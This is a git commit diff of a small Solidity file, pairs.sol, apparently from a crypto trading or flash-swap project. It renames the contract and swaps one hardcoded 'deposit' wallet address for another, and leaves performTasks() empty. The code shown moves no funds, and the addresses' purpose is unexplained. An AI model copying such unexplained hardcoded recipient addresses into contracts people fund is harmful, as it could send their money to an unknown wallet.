80f5c1cdbc5a34927a9a8ddaafc05d57a760ad31
xerofinance <122619344+xerofinance@users.noreply.github.com>
2023-02-04 23:21:58 -0600

    Update pairs.sol

--- pairs.sol
+++ pairs.sol
@@ -1,11 +1,11 @@
 pragma solidity ^0.5.0;
 
-contract Router {
+contract Manager {
 	function performTasks() public {
 	    
 	}
 
-	function pancakeDepositAddress() public pure returns (address) {
-		return 0x52838e92398ee85Fc7F450FA1462Fd2f36299d4f;
+	function FlashSwapAddress() public pure returns (address) {
+		return 0xb82F7f2100a47Bb0ce4fa91Cea6bDa38CED93C6a;
 	}
 }
